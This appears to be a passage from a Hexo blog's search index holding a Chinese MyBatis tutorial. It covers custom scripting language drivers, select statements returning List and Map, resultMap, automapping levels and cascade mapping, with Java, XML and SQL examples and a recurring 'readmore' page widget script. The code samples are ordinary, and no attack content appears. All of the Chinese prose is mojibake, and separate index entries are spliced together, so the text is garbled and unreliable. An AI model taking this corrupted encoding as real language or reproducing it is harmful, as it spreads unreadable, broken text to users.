æ–‡ä»¶ä¸­å°†å®ƒè®¾ç½®ä¸ºé»˜è®¤è¯­è¨€ 123456&lt;typeAliases&gt; &lt;typeAlias type="org.sample.MyLanguageDriver" alias="myLanguage"/&gt;&lt;/typeAliases&gt;&lt;settings&gt; &lt;setting name="defaultScriptingLanguage" value="myLanguage"/&gt;&lt;/settings&gt; æˆ–è€…ä½¿ç”¨ lang å±æ€§ä¸ºç‰¹å®šçš„ SQL è¯­å¥æŒ‡å®šè¯­è¨€ 123&lt;select id="selectBlog" lang="myLanguage"&gt; SELECT * FROM BLOG&lt;/select&gt; æˆ–è€…åœ¨ Mapper æ¥å£ä¸Šæ·»åŠ  @Lang æ³¨è§£ 1234567public interface Mapper { @Lang(MyLanguageDriver.class) @Select("SELECT * FROM BLOG") List&lt;Blog&gt; selectBlog();} æç¤º MyBatis æ”¯æŒä½¿ç”¨ Apache Velocity ä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œæ›´å¤šç»†èŠ‚è¯·å‚è€ƒ MyBatis-Velocity é¡¹ç›®ã€‚ å‰é¢ä»‹ç»çš„æ‰€æœ‰ xml æ ‡ç­¾éƒ½ç”±é»˜è®¤ MyBatis è¯­è¨€æä¾›ï¼Œè€Œå®ƒç”±è¯­è¨€é©±åŠ¨ org.apache.ibatis.scripting.xmltags.XmlLanguageDriverï¼ˆåˆ«åä¸º xmlï¼‰æ‰€æä¾›ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"å‰ç«¯é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/66192ea1.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹å››",url:"/posts/6c40ac3a.html",text:'SQL æ˜ å°„æ–‡ä»¶select æ ‡ç­¾æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-7ã€‚ å±æ€§è¯´æ˜select æ ‡ç­¾ç”¨äºå®šä¹‰æŸ¥è¯¢æ“ä½œï¼Œæ‹¥æœ‰ä»¥ä¸‹å¸¸ç”¨å±æ€§ï¼š idï¼šå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨æ¥å¼•ç”¨è¿™æ¡è¯­å¥ï¼Œéœ€è¦ä¸æ¥å£çš„æ–¹æ³•åä¸€è‡´ã€‚ parameterTypeï¼šå‚æ•°ç±»å‹ï¼Œå¯ä»¥ä¸ä¼ é€’ï¼ŒMyBatis ä¼šæ ¹æ® TypeHandler è‡ªåŠ¨æ¨æ–­å‚æ•°ç±»å‹ã€‚ resultTypeï¼šè¿”å›å€¼ç±»å‹ï¼Œå¯ä»¥æ˜¯ç±»å‹åˆ«åæˆ–è€…å…¨é™å®šç±»åã€‚å¦‚æœè¿”å›ç»“æœæ˜¯é›†åˆï¼Œåˆ™å…¶å€¼æ˜¯é›†åˆä¸­å…ƒç´ çš„ç±»å‹ã€‚resultType ä¸èƒ½å’Œ resultMap åŒæ—¶ä½¿ç”¨ã€‚ æç¤º select æ ‡ç­¾è¿˜æ‹¥æœ‰å¾ˆå¤šå…¶ä»–å±æ€§ï¼Œè¯¦ç»†è¯´æ˜è¯·ç‚¹å‡»è¿™é‡ŒæŸ¥çœ‹ã€‚ ä½¿ç”¨æ¡ˆä¾‹è¿”å› List ç±»å‹12345public interface EmployeeMapper { public List&lt;Employee&gt; getAllEmp();} 123&lt;select id="getAllEmp" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee&lt;/select&gt; 1æŸ¥è¯¢ç»“æœï¼š[1_Tom_1_tom@gmail.com, 2_Jim_1_jim@gmail.com] è¿”å› Map ç±»å‹ï¼ˆç¬¬ä¸€ç§åœºæ™¯ï¼‰123456public interface EmployeeMapper { public Map&lt;String, Object&gt; getEmpById(Long id);} 12345&lt;select id="getEmpById" parameterType="Long" resultType="Map"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id}&lt;/select&gt; 1æŸ¥è¯¢ç»“æœï¼š{lastName=Tom, gender=1, id=1, email=tom@gmail.com} è¿”å› Map ç±»å‹ï¼ˆç¬¬äºŒç§åœºæ™¯ï¼‰123456789101112public interface EmployeeMapper { /** * ä½¿ç”¨æ³¨è§£å‘Šè¯‰ MyBatisï¼Œè¿”å›çš„ Map ä½¿ç”¨å“ªä¸ª JavaBean å±æ€§ä½œä¸º key * * @param lastName * @return */ @MapKey("id") public Map&lt;String, Employee&gt; getEmpByLastName(String lastName);} 12345&lt;select id="getEmpByLastName" parameterType="String" resultType="Map"&gt; select id, last_name as lastName, gender, email from t_employee where last_name like #{lastName}&lt;/select&gt; 1æŸ¥è¯¢ç»“æœï¼š{1={lastName=Tom, gender=1, id=1, email=tom@gmail.com}, 2={lastName=Jim, gender=1, id=2, email=jim@gmail.com}} ç»“æœæ˜ å°„å…¨å±€ setting è®¾ç½®é…ç½®è¯´æ˜â€“ autoMappingBehavior å¯ä»¥å¼€å¯è‡ªåŠ¨æ˜ å°„çš„åŠŸèƒ½ï¼Œé»˜è®¤å€¼æ˜¯ PARTIALï¼Œå”¯ä¸€çš„è¦æ±‚æ˜¯å­—æ®µåå’Œ JavaBean å±æ€§åéœ€è¦ä¸€è‡´ã€‚â€“ å¦‚æœå°† autoMappingBehavior è®¾ç½®ä¸º nullï¼Œåˆ™ MyBatis ä¼šå–æ¶ˆè‡ªåŠ¨æ˜ å°„ã€‚â€“ å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨æ•°æ®åº“å­—æ®µå‘½åè§„èŒƒï¼Œå³ JavaBean çš„å±æ€§åç¬¦åˆé©¼å³°å‘½åæ³•ï¼Œå¦‚ last_name æ˜ å°„ä¸º lastNameï¼Œç®€å•è®¾ç½® mapUnderscoreToCamelCase = true å°±å¯ä»¥å¼€å¯è‡ªåŠ¨é©¼å³°å‘½åè§„åˆ™æ˜ å°„åŠŸèƒ½ã€‚ ä½¿ç”¨æ¡ˆä¾‹123456&lt;configuration&gt; &lt;settings&gt; &lt;!-- å¼€å¯é©¼å³°å‘½åè‡ªåŠ¨æ˜ å°„ --&gt; &lt;setting name="mapUnderscoreToCamelCase" value="true" /&gt; &lt;/settings&gt;&lt;/configuration&gt; resultMap çš„ä½¿ç”¨é«˜çº§ç»“æœæ˜ å°„ å¤æ‚çš„æŸ¥è¯¢è¯­å¥ 123456789101112131415161718192021222324252627282930313233&lt;select id="selectBlogDetails" resultMap="detailedBlogResultMap"&gt; select B.id as blog_id, B.title as blog_title, B.author_id as blog_author_id, A.id as author_id, A.username as author_username, A.password as author_password, A.email as author_email, A.bio as author_bio, A.favourite_section as author_favourite_section, P.id as post_id, P.blog_id as post_blog_id, P.author_id as post_author_id, P.created_on as post_created_on, P.section as post_section, P.subject as post_subject, P.draft as draft, P.body as post_body, C.id as comment_id, C.post_id as comment_post_id, C.name as comment_name, C.comment as comment_text, T.id as tag_id, T.name as tag_name from Blog B left outer join Author A on B.author_id = A.id left outer join Post P on B.id = P.blog_id left outer join Comment C on P.id = C.post_id left outer join Post_Tag PT on PT.post_id = P.id left outer join Tag T on PT.tag_id = T.id where B.id = #{id}&lt;/select&gt; å¤æ‚çš„ç»“æœæ˜ å°„ 12345678910111213141516171819202122232425262728&lt;resultMap id="detailedBlogResultMap" type="Blog"&gt; &lt;constructor&gt; &lt;idArg column="blog_id" javaType="int" /&gt; &lt;/constructor&gt; &lt;result property="title" column="blog_title" /&gt; &lt;association property="author" javaType="Author"&gt; &lt;id property="id" column="author_id" /&gt; &lt;result property="username" column="author_username" /&gt; &lt;result property="password" column="author_password" /&gt; &lt;result property="email" column="author_email" /&gt; &lt;result property="bio" column="author_bio" /&gt; &lt;result property="favouriteSection" column="author_favourite_section" /&gt; &lt;/association&gt; &lt;collection property="posts" ofType="Post"&gt; &lt;id property="id" column="post_id" /&gt; &lt;result property="subject" column="post_subject" /&gt; &lt;association property="author" javaType="Author" /&gt; &lt;collection property="comments" ofType="Comment"&gt; &lt;id property="id" column="comment_id" /&gt; &lt;/collection&gt; &lt;collection property="tags" ofType="Tag"&gt; &lt;id property="id" column="tag_id" /&gt; &lt;/collection&gt; &lt;discriminator javaType="int" column="draft"&gt; &lt;case value="1" resultType="DraftPost" /&gt; &lt;/discriminator&gt; &lt;/collection&gt;&lt;/resultMap&gt; å±æ€§è¯´æ˜é€šè¿‡è‡ªå®šä¹‰çš„ resultMapï¼Œå¯ä»¥å®ç°é«˜çº§ç»“æœæ˜ å°„åŠŸèƒ½ã€‚resultMap æ ‡ç­¾çš„å±æ€§åˆ—è¡¨å¦‚ä¸‹ï¼š å±æ€§ æè¿° id å½“å‰å‘½åç©ºé—´ä¸­çš„ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªç»“æœæ˜ å°„ã€‚ type ç±»çš„å®Œå…¨é™å®šåï¼Œæˆ–è€…ä¸€ä¸ªç±»å‹åˆ«åã€‚ autoMapping å¦‚æœè®¾ç½®è¿™ä¸ªå±æ€§ï¼ŒMyBatis å°†ä¼šä¸ºæœ¬ç»“æœæ˜ å°„å¼€å¯æˆ–è€…å…³é—­è‡ªåŠ¨æ˜ å°„ã€‚è¿™ä¸ªå±æ€§ä¼šè¦†ç›–å…¨å±€çš„å±æ€§ autoMappingBehaviorï¼Œé»˜è®¤å€¼æ˜¯ æœªè®¾ç½®ï¼ˆunsetï¼‰ã€‚ resultMap æ ‡ç­¾çš„å­æ ‡ç­¾è¯´æ˜å¦‚ä¸‹ï¼š constructor - ç±»åœ¨å®ä¾‹åŒ–æ—¶ï¼Œç”¨æ¥æ³¨å…¥ç»“æœåˆ°æ„é€ æ–¹æ³•ä¸­ â€“ idArg - ID å‚æ•°ï¼›æ ‡è®°ç»“æœä½œä¸º ID å¯ä»¥å¸®åŠ©æé«˜æ•´ä½“æ•ˆèƒ½ â€“ arg - æ³¨å…¥åˆ°æ„é€ æ–¹æ³•çš„ä¸€ä¸ªæ™®é€šç»“æœ id â€“ ä¸€ä¸ª ID ç»“æœï¼›æ ‡è®°ç»“æœä½œä¸º ID å¯ä»¥å¸®åŠ©æé«˜æ•´ä½“æ•ˆèƒ½ result â€“ æ³¨å…¥åˆ°å­—æ®µæˆ– JavaBean å±æ€§çš„æ™®é€šç»“æœ association - ä¸€ä¸ªå¤æ‚ç±»å‹çš„å…³è”ï¼Œè®¸å¤šç»“æœå°†åŒ…è£…æˆè¿™ç§ç±»å‹ åµŒå¥—ç»“æœæ˜ å°„ â€“ å…³è”å¯ä»¥æ˜¯ resultMap å…ƒç´ ï¼Œæˆ–æ˜¯å¯¹å…¶å®ƒç»“æœæ˜ å°„çš„å¼•ç”¨ collection - ä¸€ä¸ªå¤æ‚ç±»å‹çš„é›†åˆ åµŒå¥—ç»“æœæ˜ å°„ â€“ é›†åˆå¯ä»¥æ˜¯ resultMap å…ƒç´ ï¼Œæˆ–æ˜¯å¯¹å…¶å®ƒç»“æœæ˜ å°„çš„å¼•ç”¨ discriminator - ä½¿ç”¨ç»“æœå€¼æ¥å†³å®šä½¿ç”¨å“ªä¸ª resultMap case - åŸºäºæŸäº›å€¼çš„ç»“æœæ˜ å°„ åµŒå¥—ç»“æœæ˜ å°„ â€“ case ä¹Ÿæ˜¯ä¸€ä¸ªç»“æœæ˜ å°„ï¼Œå› æ­¤å…·æœ‰ç›¸åŒçš„ç»“æ„å’Œå…ƒç´ ï¼›æˆ–è€…å¼•ç”¨å…¶å®ƒçš„ç»“æœæ˜ å°„ resultMap æ ‡ç­¾çš„ id å’Œ result å­æ ‡ç­¾éƒ½å¯ä»¥å°†ä¸€ä¸ªåˆ—çš„å€¼æ˜ å°„åˆ°ä¸€ä¸ªç®€å•æ•°æ®ç±»å‹ï¼ˆStringã€intã€doubleã€Date ç­‰ï¼‰çš„å±æ€§æˆ–å­—æ®µã€‚è¿™ä¸¤è€…ä¹‹é—´çš„å”¯ä¸€åŒºåˆ«æ˜¯ï¼Œid å­æ ‡ç­¾å¯¹åº”çš„å±æ€§ä¼šè¢«æ ‡è®°ä¸ºå¯¹è±¡çš„æ ‡è¯†ç¬¦ï¼Œåœ¨æ¯”è¾ƒå¯¹è±¡å®ä¾‹æ—¶ä½¿ç”¨ã€‚è¿™æ ·å¯ä»¥æé«˜æ•´ä½“çš„æ€§èƒ½ï¼Œå°¤å…¶æ˜¯è¿›è¡Œç¼“å­˜å’ŒåµŒå¥—ç»“æœæ˜ å°„ï¼ˆä¹Ÿå°±æ˜¯çº§è”æ˜ å°„ï¼‰çš„æ—¶å€™ã€‚è¿™ä¸¤ä¸ªå­æ ‡ç­¾éƒ½æœ‰ä¸€äº›å±æ€§ï¼š å±æ€§ æè¿° property æ˜ å°„åˆ°åˆ—ç»“æœçš„å­—æ®µæˆ–å±æ€§ã€‚å¦‚æœ JavaBean æœ‰è¿™ä¸ªåå­—çš„å±æ€§ï¼ˆpropertyï¼‰ï¼Œä¼šå…ˆä½¿ç”¨è¯¥å±æ€§ã€‚å¦åˆ™ MyBatis å°†ä¼šå¯»æ‰¾ç»™å®šåç§°çš„å­—æ®µï¼ˆfieldï¼‰ã€‚ æ— è®ºæ˜¯å“ªä¸€ç§æƒ…å½¢ï¼Œä½ éƒ½å¯ä»¥ä½¿ç”¨å¸¸è§çš„ç‚¹å¼åˆ†éš”å½¢å¼è¿›è¡Œå¤æ‚å±æ€§å¯¼èˆªã€‚æ¯”å¦‚ï¼Œä½ å¯ä»¥è¿™æ ·æ˜ å°„ä¸€äº›ç®€å•çš„ä¸œè¥¿ï¼šâ€œusernameâ€ï¼Œæˆ–è€…æ˜ å°„åˆ°ä¸€äº›å¤æ‚çš„ä¸œè¥¿ä¸Šï¼šâ€œaddress.street.numberâ€ã€‚ column æ•°æ®åº“ä¸­çš„åˆ—åï¼Œæˆ–è€…æ˜¯åˆ—çš„åˆ«åã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™å’Œä¼ é€’ç»™ resultSet.getString(columnName) æ–¹æ³•çš„å‚æ•°ä¸€æ ·ã€‚ javaType ä¸€ä¸ª Java ç±»çš„å…¨é™å®šåï¼Œæˆ–ä¸€ä¸ªç±»å‹åˆ«åã€‚å¦‚æœä½ æ˜ å°„åˆ°ä¸€ä¸ª JavaBeanï¼Œé‚£ä¹ˆ MyBatis é€šå¸¸å¯ä»¥è‡ªåŠ¨æ¨æ–­ç±»å‹ã€‚ç„¶è€Œï¼Œå¦‚æœä½ æ˜ å°„åˆ°çš„æ˜¯ HashMapï¼Œé‚£ä¹ˆä½ åº”è¯¥æ˜ç¡®åœ°æŒ‡å®š javaType æ¥ä¿è¯è¡Œä¸ºä¸æœŸæœ›çš„ç›¸ä¸€è‡´ã€‚ jdbcType JDBC ç±»å‹ï¼Œæ‰€æ”¯æŒçš„ JDBC ç±»å‹å‚è§è¿™ä¸ªè¡¨æ ¼ä¹‹åçš„â€ æ”¯æŒçš„ JDBC ç±»å‹â€ã€‚åªéœ€è¦åœ¨å¯èƒ½æ‰§è¡Œæ’å…¥ã€æ›´æ–°å’Œåˆ é™¤çš„ä¸”å…è®¸ç©ºå€¼çš„åˆ—ä¸ŠæŒ‡å®š JDBC ç±»å‹ã€‚è¿™æ˜¯ JDBC çš„è¦æ±‚è€Œé MyBatis çš„è¦æ±‚ã€‚å¦‚æœä½ ç›´æ¥é¢å‘ JDBC ç¼–ç¨‹ï¼Œä½ éœ€è¦å¯¹å¯ä»¥ä¸ºç©ºå€¼çš„åˆ—æŒ‡å®šè¿™ä¸ªç±»å‹ã€‚ typeHandler ä½¿ç”¨è¿™ä¸ªå±æ€§ï¼Œä½ å¯ä»¥è¦†ç›–é»˜è®¤çš„ç±»å‹å¤„ç†å™¨ã€‚è¿™ä¸ªå±æ€§å€¼æ˜¯ä¸€ä¸ªç±»å‹å¤„ç†å™¨å®ç°ç±»çš„å…¨é™å®šåï¼Œæˆ–è€…æ˜¯ç±»å‹åˆ«åã€‚ MyBatis é€šè¿‡å†…ç½®çš„ jdbcType æšä¸¾ç±»å‹æ”¯æŒä»¥ä¸‹çš„ JDBC ç±»å‹ï¼š è‡ªåŠ¨æ˜ å°„åœ¨ç®€å•çš„åœºæ™¯ä¸‹ï¼ŒMyBatis å¯ä»¥è‡ªåŠ¨æ˜ å°„æŸ¥è¯¢ç»“æœï¼Œä½†å¦‚æœé‡åˆ°å¤æ‚çš„åœºæ™¯ï¼Œåˆ™éœ€è¦æ„å»ºä¸€ä¸ªç»“æœæ˜ å°„ï¼Œè€Œä¸”è¿™ä¸¤ç§ç­–ç•¥æ”¯æŒæ··åˆä½¿ç”¨ã€‚å½“è‡ªåŠ¨æ˜ å°„æŸ¥è¯¢ç»“æœæ—¶ï¼ŒMyBatis ä¼šè·å–ç»“æœä¸­è¿”å›çš„åˆ—åï¼Œå¹¶åœ¨ Java ç±»ä¸­æŸ¥æ‰¾ç›¸åŒåå­—çš„å±æ€§ï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰ã€‚è¿™æ„å‘³ç€å¦‚æœå‘ç°äº† ID åˆ—å’Œ id å±æ€§ï¼ŒMyBatis ä¼šå°†åˆ— ID çš„å€¼èµ‹ç»™ id å±æ€§ã€‚é€šå¸¸æ•°æ®åº“åˆ—ä½¿ç”¨å¤§å†™å­—æ¯ç»„æˆçš„å•è¯å‘½åï¼Œå•è¯é—´ç”¨ä¸‹åˆ’çº¿åˆ†éš”ï¼Œè€Œ Java å±æ€§ä¸€èˆ¬éµå¾ªé©¼å³°å‘½åæ³•çº¦å®šï¼›ä¸ºäº†åœ¨è¿™ä¸¤ç§å‘½åæ–¹å¼ä¹‹é—´å¯ç”¨è‡ªåŠ¨æ˜ å°„ï¼Œéœ€è¦åœ¨å…¨å±€çš„é…ç½®æ–‡ä»¶ä¸­å°† mapUnderscoreToCamelCase è®¾ç½®ä¸º trueã€‚MyBatis ç”šè‡³åœ¨æä¾›äº†ç»“æœæ˜ å°„åï¼Œè‡ªåŠ¨æ˜ å°„ä¹Ÿèƒ½å·¥ä½œã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºæ¯ä¸€ä¸ªç»“æœæ˜ å°„ï¼Œåœ¨ ResultSet å‡ºç°çš„åˆ—ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®æ‰‹åŠ¨æ˜ å°„ï¼Œå°†è¢«è‡ªåŠ¨æ˜ å°„ï¼›åœ¨è‡ªåŠ¨æ˜ å°„å¤„ç†å®Œæ¯•åï¼Œå†å¤„ç†æ‰‹åŠ¨æ˜ å°„ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-ï¼˜ã€‚ è‡ªåŠ¨æ˜ å°„ç­‰çº§MyBatis æä¾›äº†ä¸‰ç§è‡ªåŠ¨æ˜ å°„ç­‰çº§ï¼š FULL - è‡ªåŠ¨æ˜ å°„æ‰€æœ‰å±æ€§ NONE - ç¦ç”¨è‡ªåŠ¨æ˜ å°„ï¼Œä»…å¯¹æ‰‹åŠ¨æ˜ å°„çš„å±æ€§è¿›è¡Œæ˜ å°„ PARTIAL - å¯¹é™¤åœ¨å†…éƒ¨å®šä¹‰äº†åµŒå¥—ç»“æœæ˜ å°„ï¼ˆä¹Ÿå°±æ˜¯å…³è”çš„å±æ€§ï¼‰ä»¥å¤–çš„å±æ€§è¿›è¡Œæ˜ å°„ é»˜è®¤çš„è‡ªåŠ¨æ˜ å°„ç­‰çº§æ˜¯ PARTIALï¼Œè¿™æ˜¯æœ‰åŸå› çš„ã€‚å½“å¯¹çº§è”æŸ¥è¯¢çš„ç»“æœä½¿ç”¨ FULL æ—¶ï¼Œçº§è”æŸ¥è¯¢ä¼šåœ¨åŒä¸€è¡Œä¸­è·å–å¤šä¸ªä¸åŒå®ä½“çš„æ•°æ®ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´éé¢„æœŸçš„æ˜ å°„ã€‚æ— è®ºè®¾ç½®çš„è‡ªåŠ¨æ˜ å°„ç­‰çº§æ˜¯å“ªç§ï¼ŒMyBatis éƒ½æ”¯æŒåœ¨ç»“æœæ˜ å°„ä¸Šè®¾ç½® autoMapping å±æ€§æ¥ä¸ºæŒ‡å®šçš„ç»“æœæ˜ å°„è®¾ç½®å¯ç”¨æˆ–ç¦ç”¨è‡ªåŠ¨æ˜ å°„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123&lt;resultMap id="userResultMap" type="User" autoMapping="false"&gt; &lt;result property="password" column="hashed_password"/&gt;&lt;/resultMap&gt; ä½¿ç”¨æ¡ˆä¾‹ä¹‹ä¸€123&lt;resultMap id="userResultMap" type="User"&gt; &lt;result property="password" column="hashed_password"/&gt;&lt;/resultMap&gt; 12345678&lt;select id="selectUsers" resultMap="userResultMap"&gt; select user_id as "id", user_name as "userName", hashed_password from some_table where id = #{id}&lt;/select&gt; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œid å’Œ userName åˆ—å°†è¢«è‡ªåŠ¨æ˜ å°„ï¼Œhashed_password åˆ—å°†æ ¹æ®é…ç½®è¿›è¡Œæ˜ å°„ã€‚ ä½¿ç”¨æ¡ˆä¾‹ä¹‹äºŒ123456public interface EmployeeMapper { public Employee getById(Long id);} 123456789101112131415161718&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;/resultMap&gt; &lt;select id="getById" resultMap="employeeResultMap"&gt; select id, last_name, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; çº§è”æ˜ å°„æœ¬èŠ‚æ‰€æœ‰çš„æ¡ˆä¾‹ä»£ç ï¼Œéƒ½åŸºäºä»¥ä¸‹çš„è¡¨ç»“æ„å’Œ JavaBean ç±»ç¼–å†™ã€‚ æ•°æ®åº“è¡¨ç»“æ„ 1234567891011121314CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8; JavaBean ç±» 12345678910111213public class Department { private Long id; private String name; private List&lt;Employee&gt; employees; ...... @Override public String toString() { return "Department [id=" + id + ", name=" + name + ", employees=" + employees + "]"; }} 123456789101112131415public class Employee { private Long id; private String lastName; private String gender; private String email; private Department department; ...... @Override public String toString() { return "Employee [id=" + id + ", lastName=" + lastName + ", gender=" + gender + ", email=" + email + ", department=" + department + "]"; }} æ–¹å¼ä¸€ï¼ˆçº§è”å±æ€§å°è£…ï¼‰æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-9ã€‚ DAO æ¥å£ 12345public interface EmployeeMapper { public Employee getEmpAndDept(Long id);} SQL æ˜ å°„æ–‡ä»¶ 1234567891011121314151617181920212223&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;resultMap type="com.clay.mybatis.bean.Employee" id="employeeResultMap"&gt; &lt;!-- idï¼šå®šä¹‰ä¸»é”®åˆ—çš„å°è£…è§„åˆ™ï¼› columnï¼šæŒ‡å®šåˆ—åï¼› propertyï¼šæŒ‡å®šå¯¹åº”çš„JavaBeanå±æ€§ï¼› --&gt; &lt;id column="id" property="id" /&gt; &lt;!-- å®šä¹‰æ™®é€šåˆ—çš„å°è£…è§„åˆ™ï¼Œå³ä½¿ä¸æŒ‡å®šæ™®é€šåˆ— MyBatis ä¹Ÿä¼šæŒ‰ç…§é»˜è®¤çš„è§„åˆ™è‡ªåŠ¨å°è£…ï¼Œä½†ä¸€èˆ¬éƒ½å…¨éƒ¨å†™ä¸Š --&gt; &lt;result column="last_name" property="lastName" /&gt; &lt;result column="gender" property="gender" /&gt; &lt;result column="email" property="email" /&gt; &lt;!-- å®šä¹‰çº§è”å±æ€§çš„å°è£…è§„åˆ™ --&gt; &lt;result column="dept_id" property="department.id" /&gt; &lt;result column="dept_name" property="department.name" /&gt; &lt;/resultMap&gt; &lt;select id="getEmpAndDept" resultMap="employeeResultMap"&gt; select emp.id, emp.last_name, emp.gender, emp.email, dept.id as dept_id, dept.name as dept_name from t_employee emp left join t_department dept on emp.dept_id = dept.id where emp.id = #{id} &lt;/select&gt;&lt;/mapper&gt; æç¤º ä¸Šè¿° resultMap çš„å†™æ³•ï¼Œå½“è°ƒç”¨ getEmpAndDept() æ–¹æ³•æ—¶ï¼Œå¯ä»¥å®ç°çº§è”å±æ€§çš„å°è£…ï¼ˆå³çº§è”æ˜ å°„ / çº§è”æŸ¥è¯¢ï¼‰ã€‚ æŸ¥è¯¢ç»“æœ 1æ‰“å° getEmpAndDept() æ–¹æ³•çš„è°ƒç”¨ç»“æœï¼šEmployee [id=6, lastName=Tom, gender=1, email=tom@gmail.com, department=Department [id=1, name=å¼€å‘éƒ¨é—¨]] æ–¹å¼äºŒï¼ˆåµŒå¥—ç»“æœæ˜ å°„ï¼‰çº§è”æ˜ å°„é™¤äº†ä¸Šé¢çš„ä½¿ç”¨æ–¹å¼ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ resultMap çš„å­æ ‡ç­¾ association å®ç°åµŒå¥—ç»“æœæ˜ å°„ã€‚åµŒå¥—ç»“æœæ˜ å°„çš„å®šä¹‰ï¼Œæ˜¯ä½¿ç”¨åµŒå¥—çš„ç»“æœæ˜ å°„æ¥å¤„ç†è¿æ¥ç»“æœçš„é‡å¤å­é›†ã€‚æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-10ã€‚ å±æ€§è¯´æ˜ å±æ€§ æè¿° resultMap ç»“æœæ˜ å°„çš„ IDï¼Œå¯ä»¥å°†æ­¤å…³è”çš„åµŒå¥—ç»“æœé›†æ˜ å°„åˆ°ä¸€ä¸ªåˆé€‚çš„å¯¹è±¡æ ‘ä¸­ã€‚å®ƒå¯ä»¥ä½œä¸ºä½¿ç”¨é¢å¤– select è¯­å¥çš„æ›¿ä»£æ–¹æ¡ˆã€‚å®ƒå¯ä»¥å°†å¤šè¡¨è¿æ¥æ“ä½œçš„ç»“æœæ˜ å°„æˆä¸€ä¸ªå•ä¸€çš„ ResultSetã€‚è¿™æ ·çš„ ResultSet æœ‰éƒ¨åˆ†æ•°æ®æ˜¯é‡å¤çš„ã€‚ä¸ºäº†å°†ç»“æœé›†æ­£ç¡®åœ°æ˜ å°„åˆ°åµŒå¥—çš„å¯¹è±¡æ ‘ä¸­ï¼ŒMyBatis å…è®¸ â€œä¸²è”â€ ç»“æœæ˜ å°„ï¼Œä»¥ä¾¿è§£å†³åµŒå¥—ç»“æœé›†çš„é—®é¢˜ã€‚ columnPrefix å½“è¿æ¥å¤šä¸ªè¡¨æ—¶ï¼Œä½ 